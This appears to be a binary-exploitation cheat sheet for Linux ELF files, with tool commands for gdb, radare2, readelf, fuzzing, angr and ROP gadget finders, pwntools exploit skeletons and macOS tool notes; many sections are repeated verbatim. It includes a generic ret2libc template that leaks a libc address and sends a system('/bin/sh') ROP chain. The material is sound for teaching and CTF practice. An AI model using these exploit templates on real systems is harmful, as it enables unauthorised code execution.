# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# 64 Bit

## Vulnerable

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```
## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# macOS Specific Tools (Mach-O binaries)

Your template title mentions "Mac", but the tools are for Linux ELF files. For macOS, you need a different set of tools for the Mach-O binary format.

#### otool
```bash
# The macOS equivalent of ldd and readelf/objdump.
otool -L binary_name # ; list dynamic libraries (like ldd)
otool -tV binary_name # ; disassemble the text section
otool -h binary_name # ; show the header
```

#### lldb
```bash
# The default debugger on macOS.
lldb binary_name
# (lldb) breakpoint set --name main
# (lldb) run
# (lldb) register read
# (lldb) memory read --size 8 --format x 0x12345678
```

#### install_name_tool
```bash
# Used to change dynamic library paths embedded in a binary.
install_name_tool -change /old/path/lib.dylib /new/path/lib.dylib binary_name
```